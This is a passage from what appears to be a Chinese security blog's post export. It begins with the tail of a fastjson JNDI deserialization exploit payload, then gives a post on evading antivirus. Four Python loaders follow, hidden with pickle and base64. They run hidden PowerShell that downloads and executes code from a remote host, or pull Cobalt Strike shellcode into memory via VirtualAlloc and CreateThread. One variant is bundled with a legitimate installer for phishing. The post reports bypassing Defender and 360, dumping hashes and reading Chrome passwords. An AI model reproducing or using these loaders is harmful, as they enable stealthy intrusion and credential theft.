<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;a&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Class&quot;</span>, </span><br><span class="line">        <span class="string">&quot;val&quot;</span>: <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">    &#125;, </span><br><span class="line">    <span class="string">&quot;b&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>, </span><br><span class="line">        <span class="string">&quot;dataSourceName&quot;</span>: <span class="string">&quot;rmi://x.x.x.x:1098/jndi&quot;</span>, </span><br><span class="line">        <span class="string">&quot;autoCommit&quot;</span>: <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>æ¼æ´å¤ç°</category>
      </categories>
      <tags>
        <tag>fastjson</tag>
      </tags>
  </entry>
  <entry>
    <title>bypassæ€è½¯</title>
    <url>/posts/ccfc56a5/</url>
    <content><![CDATA[<p>åˆ†ç¦»å…æ€</p>
<a id="more"></a>



<p>å‚è€ƒï¼š</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3Mvc2Q3M2VMMy1Ubk1tMHpXTENDOGNPUQ==">https://mp.weixin.qq.com/s/sd73eL3-TnMm0zWLCC8cOQ<i class="fa fa-external-link-alt"></i></span></p>
<p>æ–‡ç« çš„æ€è·¯å¯å€Ÿé‰´</p>
<p>å€Ÿé‰´ç¨³æ€è·¯ï¼Œå¹¶å‘å±•ã€‚</p>
<p><strong>æ³¨æ„âš ï¸ï¼špyinstallerè¢«æ‹‰é»‘äº†ã€‚ã€‚ã€‚</strong></p>
<blockquote>
<p>æ€»æ˜¯è‡ªå·±å®éªŒè¿‡æ‰çŸ¥é“ï¼Œè¦ä¹ˆå°±æ˜¯å†™ä¸ªå·¥å…·ã€‚</p>
</blockquote>
<h2 id="ç¬¬ä¸€ç§æ–¹å¼"><a href="#ç¬¬ä¸€ç§æ–¹å¼" class="headerlink" title="ç¬¬ä¸€ç§æ–¹å¼"></a>ç¬¬ä¸€ç§æ–¹å¼</h2><p>åˆ©ç”¨ååºåˆ—åŒ–åŠ è½½powershellã€‚</p>
<ol>
<li>å¤åˆ¶æ–‡ä»¶ï¼Œè¿è¡Œï¼Œå¾—åˆ°åºåˆ—åŒ–åçš„å¯¹è±¡</li>
<li>å°†åºåˆ—åŒ–æ¨¡å—çš„ä»£ç æ³¨é‡Šï¼Œå¯ç”¨ååºåˆ—åŒ–æ¨¡å—</li>
<li>åºåˆ—åŒ–åçš„å¯¹è±¡(payload)ï¼Œæ”¾åœ¨ååºåˆ—åŒ–æ¨¡å—çš„paylaodä¸­ã€‚</li>
</ol>
<p><strong>è¿‡DEFï¼Œ360å«å£«ï¼Œæ²¡æµ‹è¯•ç«ç»’ã€‚</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">## -------------------------ååºåˆ—åŒ–æ¨¡å—--------------</span></span><br><span class="line"><span class="comment">## -----å°†åºåˆ—åŒ–ç”Ÿæˆçš„å€¼ï¼Œæ”¾åœ¨payloadä¸­å³å¯ã€‚-----------</span></span><br><span class="line"><span class="comment">## æ‰“åŒ…æ–¹å¼ :  pyinstall --noconsole -F bypass03.py</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># import pickle</span></span><br><span class="line"><span class="comment"># import base64</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># class Pay():</span></span><br><span class="line"><span class="comment">#     def __init__(self):</span></span><br><span class="line"><span class="comment">#     	self.unsearize()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#     def unsearize(self):</span></span><br><span class="line"><span class="comment">#         payload_ = b&#x27;\x80\x04\x95\xb1\x00\x00\x00\x00\x00\x00\x00&#125;\x94\x8c\x03pay\x94C\xa4Y21kLmV4ZSAvYyBwb3dlcnNoZWxsLmV4ZSAtbm9wIC13IGhpZGRlbiAtYyAiSUVYICgobmV3LW9iamVjdCBuZXQud2ViY2xpZW50KS5kb3dubG9hZHN0cmluZygnaHR0cDovLzE3Mi4yMC4xMC4zOjg4ODgvYScpKSI=\x94s.&#x27;</span></span><br><span class="line"><span class="comment">#         res_ = pickle.loads(payload_)</span></span><br><span class="line"><span class="comment">#         # # # print(type(base64.b64decode(res_[&#x27;pay&#x27;]).decode()))</span></span><br><span class="line"><span class="comment">#         os.system(base64.b64decode(res_[&#x27;pay&#x27;]).decode())</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># if __name__ == &#x27;__main__&#x27;:</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#     p = Pay()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ------------------------åºåˆ—åŒ–æ¨¡å—---------------------</span></span><br><span class="line"><span class="comment"># ------ åºåˆ—åŒ–æ¨¡å—ï¼Œå°†è¾“å‡ºçš„ç»“æœæ”¾å…¥ååºåˆ—åŒ–ä¸­payloadä¸­-----</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pay</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">    	self.unsearize()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">unsearize</span>(<span class="params">self</span>):</span></span><br><span class="line"></span><br><span class="line">        p = <span class="string">&#x27;cmd.exe /c powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(\&#x27;http://172.20.10.3:8888/a\&#x27;))&quot;&#x27;</span></span><br><span class="line">        <span class="comment"># p = &#x27;cmd.exe /c powershell.exe whoami&#x27;</span></span><br><span class="line">        <span class="comment"># p = &#x27;powershell.exe whoami&#x27;</span></span><br><span class="line">        <span class="comment"># p = &#x27;cmd.exe /c whoami&#x27;</span></span><br><span class="line">        <span class="comment"># p = &#x27;powershell -nop -w hidden -encodedcommand JABAOwA=&#x27;</span></span><br><span class="line">        s = &#123;</span><br><span class="line">            <span class="string">&#x27;pay&#x27;</span>: base64.b64encode(p.encode())</span><br><span class="line">        &#125;</span><br><span class="line">        res = pickle.dumps(s)</span><br><span class="line">        print(res) <span class="comment"># è¾“å‡ºåºåˆ—åŒ–çš„ç»“æœ</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    p = Pay()</span><br></pre></td></tr></table></figure>



<h2 id="ç¬¬äºŒç§-å˜ç§"><a href="#ç¬¬äºŒç§-å˜ç§" class="headerlink" title="ç¬¬äºŒç§(å˜ç§)"></a>ç¬¬äºŒç§(å˜ç§)</h2><p><strong>è¿‡DEFï¼Œ360å«å£«ï¼Œæ²¡æµ‹è¯•ç«ç»’ã€‚</strong></p>
<p>å’Œæ­£å¸¸æ–‡ä»¶æ†ç»‘ï¼ˆé€‚ç”¨äºé’“é±¼ï¼‰ï¼Œåˆ†ç¦»å‡ºæ–‡ä»¶ï¼ˆæ–‡ä»¶ä¸ºæ­£å¸¸çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œæ¯”å¦‚QQå®‰è£…åŒ…ï¼‰</p>
<ol>
<li>å°†paylaodæ”¾åœ¨searize()å‡½æ•°ä¸­ï¼Œè¿è¡Œç¨‹åºï¼Œå¾—åˆ°åºåˆ—åŒ–åçš„payloadã€‚</li>
<li>å°†åºåˆ—åŒ–åçš„payloadæ”¾åœ¨<code>unsearize</code>ä¸­</li>
<li>å°†æ­£å¸¸çš„å®‰è£…æˆ–è€…å¯æ‰§è¡Œæ–‡ä»¶è¯»å–å¹¶è¿›è¡Œbase64ç¼–ç (æ”¾åœ¨set_exeå‡½æ•°ä¸­)</li>
<li>æ³¨é‡Šæ‰<code>__init__</code>ä¸­çš„<code>self.searize</code>,å¯ç”¨<code># self.thread()</code></li>
<li>æ‰“åŒ…å³å¯ï¼ˆå¤šä½™æ³¨é‡Šä»£ç ï¼Œæƒ³åˆ å³åˆ ï¼‰</li>
</ol>
<p>ä»£ç ä¸­çš„set_payloadå‡½æ•°()ä¸ºç›´æ¥æ‰§è¡Œpayload,æˆ‘æ²¡æµ‹è¯•ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">import</span> ctypes,codecs</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pay</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">      self.searize</span><br><span class="line">      <span class="comment"># self.thread()</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">set_exe</span>(<span class="params">self</span>):</span></span><br><span class="line">        exe_base64 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">&#x27;C:/7z.exe&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)<span class="keyword">as</span> f:</span><br><span class="line">            s = base64.b64decode(exe_base64)</span><br><span class="line">            f.write(s)</span><br><span class="line">        os.system()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># å¯ç”¨ä¸¤ä¸ªçº¿ç¨‹ï¼Œä¸€ä¸ªè¿è¡Œpayload,ä¸€ä¸ªè¿è¡Œæ­£å¸¸çš„ç¨‹åº</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">thread</span>(<span class="params">self</span>):</span></span><br><span class="line">        t1 =  threading.Thread(target=self.unsearize())</span><br><span class="line">        t2 = threading.Thread(target=self.set_exe)</span><br><span class="line">        t1.start()</span><br><span class="line">        t2.start()</span><br><span class="line">        t1.join()</span><br><span class="line">        t2.join()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># è®¾ç½®ä¸Šçº¿çš„payloadï¼Œç›´æ¥è°ƒç”¨ï¼Œä¸è¿›è¡Œä»»ä½•çš„æ“ä½œã€‚</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">set_payload</span>(<span class="params">self</span>):</span></span><br><span class="line">        s = <span class="string">&#x27;cmd.exe /c powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(\&#x27;http://172.20.10.3:8888/a\&#x27;))&quot;&#x27;</span></span><br><span class="line">        <span class="comment"># print(s)</span></span><br><span class="line">        os.system(s)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># åºåˆ—åŒ–å†…å®¹ä¸ºpaylaod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">searize</span>(<span class="params">self</span>):</span></span><br><span class="line">        p = <span class="string">&#x27;cmd.exe /c powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(\&#x27;http://172.20.10.3:8888/a\&#x27;))&quot;&#x27;</span></span><br><span class="line">        <span class="comment"># p = &#x27;cmd.exe /c powershell.exe whoami&#x27;</span></span><br><span class="line">        <span class="comment"># p = &#x27;powershell.exe whoami&#x27;</span></span><br><span class="line">        <span class="comment"># p = &#x27;cmd.exe /c whoami&#x27;</span></span><br><span class="line">        <span class="comment"># p = &#x27;powershell -nop -w hidden -encodedcommand JABzA=&#x27;</span></span><br><span class="line">        s = &#123;</span><br><span class="line">            <span class="string">&#x27;pay&#x27;</span>: base64.b64encode(p.encode())</span><br><span class="line">        &#125;</span><br><span class="line">        res = pickle.dumps(s)</span><br><span class="line">        print(res) <span class="comment"># è¾“å‡ºåºåˆ—åŒ–çš„ç»“æœ</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">## -----------------ååºåˆ—åŒ–æ‰§è¡Œæ¨¡å—-----------------</span></span><br><span class="line">        <span class="comment">##---------å°†åºåˆ—åŒ–åçš„paylaodæ”¾åœ¨unsearizeçš„paylaodä¸­-------------</span></span><br><span class="line">        <span class="comment">## -----------å°†searize()å‡½æ•°åˆ é™¤æˆ–è€…æ³¨é‡Šï¼Œå¹¶å°†ä¸‹é¢çš„unsearize()å‡½æ•°å¯ç”¨ã€‚</span></span><br><span class="line">        <span class="comment">## æ‰“åŒ… : pyinstaller --noconsole -F bypass02.py</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">unsearize</span>(<span class="params">self</span>):</span></span><br><span class="line">        payload_ = <span class="string">b&#x27;\x80\x04\x95\xb1\x00\x00\x00\x00\x00\x00\x00&#125;\x94\x8c\x03pay\x94C\xa4Y21kLmV4ZSAvYyBwb3dlcnNoZWxsLmV4ZSAtbm9wIC13IGhpZGRlbiAtYyAiSUVYICgobmV3LW9iamVjdCBuZXQud2ViY2xpZW50KS5kb3dubG9hZHN0cmluZygnaHR0cDovLzE3Mi4yMC4xMC4zOjg4ODgvYScpKSI=\x94s.&#x27;</span></span><br><span class="line">        res_ = pickle.loads(payload_)</span><br><span class="line">        <span class="comment"># # print(type(base64.b64decode(res_[&#x27;pay&#x27;]).decode()))</span></span><br><span class="line">        os.system(base64.b64decode(res_[<span class="string">&#x27;pay&#x27;</span>]).decode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    p = Pay()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="ç¬¬ä¸‰ç§"><a href="#ç¬¬ä¸‰ç§" class="headerlink" title="ç¬¬ä¸‰ç§"></a>ç¬¬ä¸‰ç§</h2><p><strong>360å«å£«ï¼Œæ²¡æµ‹è¯•ç«ç»’ã€‚</strong>å¥½åƒæ²¡æœ‰è¿‡DEFï¼Œå®éªŒæ—¶å€™å¿˜è®°äº†ï¼Œæ²¡å†å¤æµ‹ï¼Œæ’é™¤æ³•ç¡®å®šæ˜¯è¿™ä¸ªã€‚</p>
<p>æ³¨æ„âš ï¸ï¼šè¿œç¨‹shellcode(CSç”ŸæˆCè¯­è¨€çš„payloadä¹‹åï¼Œå¯¹å…¶base64ç¼–ç ï¼Œç„¶åå»æ‰bâ€™â€™,åªä¿ç•™å†…å®¹ç±»ä¼¼<code>/EiD5PDoy==</code>)</p>
<ol>
<li>é¦–å…ˆå®šä¹‰äº†shellcodeï¼Œä¸ºä¸€ä¸²pythonä»£ç ã€‚</li>
<li>å®šä¹‰äº†ä¸€ä¸ªç±»ï¼Œ<code>__reduce__</code>åœ¨è¢«<strong>ååºåˆ—åŒ–</strong>çš„æ—¶å€™æ‰§è¡Œï¼Œ<strong>ååºåˆ—åŒ–</strong>execæ‰§è¡Œçš„å†…å®¹ä¸ºshellcodeå®šä¹‰çš„ä»£ç </li>
<li>ä¿®æ”¹shellcodeä¸­çš„è¯·æ±‚URL(CSç”Ÿæˆçš„Cè¯­è¨€payload)ï¼Œç„¶åå¯¹ç±»è¿›è¡Œåºåˆ—åŒ–ã€‚è¾“å‡ºåºåˆ—åŒ–çš„ç»“æœï¼Œpayload</li>
<li>æ³¨é‡Šä¸Šé¢åºåˆ—åŒ–çš„ä»£ç ï¼Œå¯ç”¨ååºåˆ—è¿˜æ¨¡å—ï¼Œå°†åˆšåˆšç”Ÿæˆçš„payloadå†™å…¥å…¶ä¸­ã€‚æ‰“åŒ…å³å¯ã€‚</li>
</ol>
<p>åˆ†ç¦»å…æ€çš„æ€æƒ³ï¼Œæ–‡ä»¶ä¸­çœŸæ­£ä»£ç ä¸ºååºåˆ—åŒ–æ¨¡å—ï¼Œä»£ç é‡æå°ã€‚ä»£ç æ‰“åŒ…åä»…ä»…æ˜¯åŠ è½½å™¨ã€‚ç”¨æ¥åŠ è½½è¿œç¨‹shellcode</p>
<p>å°†shellcodeæ”¾åœ¨è¿œç¨‹æœåŠ¡å™¨ä¸­ï¼Œå¼€å¯WebæœåŠ¡ã€‚æ‰§è¡ŒåŠ è½½å™¨å³å¯ã€‚</p>
<p>ä¼šè‡ªåŠ¨ä¸‹è½½shellcode,ç„¶åå¼€è¾Ÿå†…å­˜å¹¶æ‰§è¡Œã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&quot;&quot;&quot; </span></span><br><span class="line"><span class="string">import ctypes,urllib.request,codecs,base64</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">shellcode = urllib.request.urlopen(&#x27;http://10.10.12.189:8000/payload.c&#x27;).read()</span></span><br><span class="line"><span class="string">shellcode = base64.b64decode(shellcode)</span></span><br><span class="line"><span class="string">shellcode =codecs.escape_decode(shellcode)[0]</span></span><br><span class="line"><span class="string">shellcode = bytearray(shellcode)</span></span><br><span class="line"><span class="string"># è®¾ç½®VirtualAllocè¿”å›ç±»å‹ä¸ºctypes.c_uint64</span></span><br><span class="line"><span class="string">ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span></span><br><span class="line"><span class="string"># ç”³è¯·å†…å­˜</span></span><br><span class="line"><span class="string">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># æ”¾å…¥shellcode</span></span><br><span class="line"><span class="string">buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</span></span><br><span class="line"><span class="string">ctypes.windll.kernel32.RtlMoveMemory(</span></span><br><span class="line"><span class="string">    ctypes.c_uint64(ptr), </span></span><br><span class="line"><span class="string">    buf, </span></span><br><span class="line"><span class="string">    ctypes.c_int(len(shellcode))</span></span><br><span class="line"><span class="string">)</span></span><br><span class="line"><span class="string"># åˆ›å»ºä¸€ä¸ªçº¿ç¨‹ä»shellcodeé˜²æ­¢ä½ç½®é¦–åœ°å€å¼€å§‹æ‰§è¡Œ</span></span><br><span class="line"><span class="string">handle = ctypes.windll.kernel32.CreateThread(</span></span><br><span class="line"><span class="string">    ctypes.c_int(0), </span></span><br><span class="line"><span class="string">    ctypes.c_int(0), </span></span><br><span class="line"><span class="string">    ctypes.c_uint64(ptr), </span></span><br><span class="line"><span class="string">    ctypes.c_int(0), </span></span><br><span class="line"><span class="string">    ctypes.c_int(0), </span></span><br><span class="line"><span class="string">    ctypes.pointer(ctypes.c_int(0))</span></span><br><span class="line"><span class="string">)</span></span><br><span class="line"><span class="string"># ç­‰å¾…ä¸Šé¢åˆ›å»ºçš„çº¿ç¨‹è¿è¡Œå®Œ</span></span><br><span class="line"><span class="string">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span>(<span class="keyword">exec</span>,(shellcode,))</span><br><span class="line"></span><br><span class="line">ret = pickle.dumps(A())</span><br><span class="line">ret_base64 = base64.b64encode(ret)</span><br><span class="line">print(ret_base64)</span><br><span class="line"><span class="comment"># ret_decode = base64.b64decode(ret_base64)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## ---------- åˆ†éš”ç¬¦----------</span></span><br><span class="line"><span class="comment">## æ›¿æ¢ä¸Šè¿°ä»£ç ä¸­çš„URLåœ°å€ã€‚æ”¹åœ°å€æ˜¯CSä¸­ç”Ÿæˆçš„Cè¯­è¨€çš„paylaod</span></span><br><span class="line"><span class="comment">## ä¸Šé¢ä»£ç è¿è¡Œåå¾—åˆ°payload,ç„¶åå°†ä¸Šé¢ä»£ç å…¨éƒ¨æ³¨é‡Š</span></span><br><span class="line"><span class="comment">## å°†payloadæ”¾åœ¨ä¸‹é¢ä»£ç çš„payloadä¸­ï¼Œ</span></span><br><span class="line"><span class="comment">## pyinstaller æ‰“åŒ…å³å¯</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># import base64,pickle,ctypes,urllib.request,codecs</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = b&#x27;gASVVwQAAAAAAACMCGJ1aWx0aW5zlIwEZXhlY5STlFg4BAAAIAppbXBvcnQgY3R5cGVzLHVybGxpYi5yZXF1ZXN0LGNvZGVjcyxiYXNlNjQKCnNoZWxsY29kZSA9IHVybGxpYi5yZXF1ZXN0LnVybG9wZW4oJ2h0dHA6Ly8xMC4xMC4xMi4xODk6ODAwMC9wYXlsb2FkLmMnKS5yZWFkKCkKc2hlbGxjb2RlID0gYmFzZTY0LmI2NGRlY29kZShzaGVsbGNvZGUpCnNoZWxsY29kZSA9Y29kZWNzLmVzY2FwZV9kZWNvZGUoc2hlbGxjb2RlKVswXQpzaGVsbGNvZGUgPSBieXRlYXJyYXkoc2hlbGxjb2RlKQojIOiuvue9rlZpcnR1YWxBbGxvY+i/lOWbnuexu+Wei+S4umN0eXBlcy5jX3VpbnQ2NApjdHlwZXMud2luZGxsLmtlcm5lbDMyLlZpcnR1YWxBbGxvYy5yZXN0eXBlID0gY3R5cGVzLmNfdWludDY0CiMg55Sz6K+35YaF5a2YCnB0ciA9IGN0eXBlcy53aW5kbGwua2VybmVsMzIuVmlydHVhbEFsbG9jKGN0eXBlcy5jX2ludCgwKSwgY3R5cGVzLmNfaW50KGxlbihzaGVsbGNvZGUpKSwgY3R5cGVzLmNfaW50KDB4MzAwMCksIGN0eXBlcy5jX2ludCgweDQwKSkKCiMg5pS+5YWlc2hlbGxjb2RlCmJ1ZiA9IChjdHlwZXMuY19jaGFyICogbGVuKHNoZWxsY29kZSkpLmZyb21fYnVmZmVyKHNoZWxsY29kZSkKY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5SdGxNb3ZlTWVtb3J5KAogICAgY3R5cGVzLmNfdWludDY0KHB0ciksIAogICAgYnVmLCAKICAgIGN0eXBlcy5jX2ludChsZW4oc2hlbGxjb2RlKSkKKQojIOWIm+W7uuS4gOS4que6v+eoi+S7jnNoZWxsY29kZemYsuatouS9jee9rummluWcsOWdgOW8gOWni+aJp+ihjApoYW5kbGUgPSBjdHlwZXMud2luZGxsLmtlcm5lbDMyLkNyZWF0ZVRocmVhZCgKICAgIGN0eXBlcy5jX2ludCgwKSwgCiAgICBjdHlwZXMuY19pbnQoMCksIAogICAgY3R5cGVzLmNfdWludDY0KHB0ciksIAogICAgY3R5cGVzLmNfaW50KDApLCAKICAgIGN0eXBlcy5jX2ludCgwKSwgCiAgICBjdHlwZXMucG9pbnRlcihjdHlwZXMuY19pbnQoMCkpCikKIyDnrYnlvoXkuIrpnaLliJvlu7rnmoTnur/nqIvov5DooYzlrowKY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5XYWl0Rm9yU2luZ2xlT2JqZWN0KGN0eXBlcy5jX2ludChoYW5kbGUpLGN0eXBlcy5jX2ludCgtMSkplIWUUpQu&#x27;</span></span><br><span class="line"><span class="comment"># pickle.loads(base64.b64decode(payload))</span></span><br></pre></td></tr></table></figure>



<h2 id="ç¬¬å››ç§-bypass360å…¨å®¶æ¡¶-DEF"><a href="#ç¬¬å››ç§-bypass360å…¨å®¶æ¡¶-DEF" class="headerlink" title="ç¬¬å››ç§(bypass360å…¨å®¶æ¡¶+DEF)"></a>ç¬¬å››ç§(bypass360å…¨å®¶æ¡¶+DEF)</h2><p>PYæ‰“åŒ…pyinstallerè¢«åˆ—å…¥é»‘åå•äº†ï¼Œå»ºè®®ç”¨å…¶ä»–æ‰“åŒ…py2exe,ä½†æ˜¯æˆ‘æœ¬åœ°py2exeæ‰“ä¸æˆä¸€ä¸ªå•ç‹¬çš„æ–‡ä»¶ï¼Œæ‰€ä»¥æ”¾å¼ƒäº†</p>
<p>pyinstall  -F x.pyï¼ˆä¸æŠ¥æ¯’ï¼‰</p>
<p>æ³¨æ„ï¼šåŠ ä¸Š<code>--noconsole</code>ç«‹é©¬æŠ¥æ¯’ï¼Œä½†æ˜¯ä¸åŠ ä¼šæœ‰é»‘çª—å£å¼¹å‡ºã€‚</p>
<p>pyinstall â€“noconsole -F x.pyï¼ˆæŠ¥æ¯’ï¼‰</p>
<p>ç›´æ¥ç”¨ç±»åŠ è½½shellcodeï¼Œçœå»äº†åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„è¿‡ç¨‹ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</p>
<p>æ³¨æ„âš ï¸ï¼šè¿œç¨‹shellcode(CSç”ŸæˆCè¯­è¨€çš„payloadä¹‹åï¼Œå¯¹å…¶base64ç¼–ç ï¼Œç„¶åå»æ‰bâ€™â€™,åªä¿ç•™å†…å®¹ç±»ä¼¼<code>/EiD5PDoy==</code>)</p>
<p>è®¿é—®è¿œç¨‹çš„shellcode,ç„¶åç”³è¯·å†…å­˜ï¼Œç›´æ¥æ‰§è¡Œã€‚ã€‚ã€‚ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">import</span> ctypes,codecs</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pay</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.set_payload()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">set_payload</span>(<span class="params">self</span>):</span></span><br><span class="line">        shellcode = urllib.request.urlopen(<span class="string">&#x27;http://10.10.12.189:8000/payload.c&#x27;</span>).read()</span><br><span class="line">        shellcode = base64.b64decode(shellcode)</span><br><span class="line">        shellcode =codecs.escape_decode(shellcode)[<span class="number">0</span>]</span><br><span class="line">        shellcode = bytearray(shellcode)</span><br><span class="line">        <span class="comment"># è®¾ç½®VirtualAllocè¿”å›ç±»å‹ä¸ºctypes.c_uint64</span></span><br><span class="line">        ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span><br><span class="line">        <span class="comment"># ç”³è¯·å†…å­˜</span></span><br><span class="line">        ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>), ctypes.c_int(len(shellcode)), ctypes.c_int(<span class="number">0x3000</span>), ctypes.c_int(<span class="number">0x40</span>))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># æ”¾å…¥shellcode</span></span><br><span class="line">        buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</span><br><span class="line">        ctypes.windll.kernel32.RtlMoveMemory(</span><br><span class="line">            ctypes.c_uint64(ptr), </span><br><span class="line">            buf, </span><br><span class="line">            ctypes.c_int(len(shellcode))</span><br><span class="line">        )</span><br><span class="line">        <span class="comment"># åˆ›å»ºä¸€ä¸ªçº¿ç¨‹ä»shellcodeé˜²æ­¢ä½ç½®é¦–åœ°å€å¼€å§‹æ‰§è¡Œ</span></span><br><span class="line">        handle = ctypes.windll.kernel32.CreateThread(</span><br><span class="line">            ctypes.c_int(<span class="number">0</span>), </span><br><span class="line">            ctypes.c_int(<span class="number">0</span>), </span><br><span class="line">            ctypes.c_uint64(ptr), </span><br><span class="line">            ctypes.c_int(<span class="number">0</span>), </span><br><span class="line">            ctypes.c_int(<span class="number">0</span>), </span><br><span class="line">            ctypes.pointer(ctypes.c_int(<span class="number">0</span>))</span><br><span class="line">        )</span><br><span class="line">        <span class="comment"># ç­‰å¾…ä¸Šé¢åˆ›å»ºçš„çº¿ç¨‹è¿è¡Œå®Œ</span></span><br><span class="line">        ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(<span class="number">-1</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    p = Pay()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="ç¬¬å››ç§æ–¹æ³•çš„æµ‹è¯•æˆªå›¾ï¼š"><a href="#ç¬¬å››ç§æ–¹æ³•çš„æµ‹è¯•æˆªå›¾ï¼š" class="headerlink" title="ç¬¬å››ç§æ–¹æ³•çš„æµ‹è¯•æˆªå›¾ï¼š"></a>ç¬¬å››ç§æ–¹æ³•çš„æµ‹è¯•æˆªå›¾ï¼š</h3><p>CSæ­£å¸¸ä¸Šçº¿ï¼Œè¯»å–hashæ­£å¸¸ã€‚</p>
<p><img src="/posts/ccfc56a5/image-20210122112552869.png" alt="image-20210122112552869"></p>
<p><strong>ä¸Šä¼ ä¸‹è½½æ­£å¸¸</strong></p>
<p><img src="/posts/ccfc56a5/image-20210122112923431.png" alt="image-20210122112923431"></p>
<p><strong>è¯»å–chromeå¯†ç æ­£å¸¸ï¼š</strong></p>
<p><img src="/posts/ccfc56a5/image-20210122113847166.png" alt="image-20210122113847166"></p>
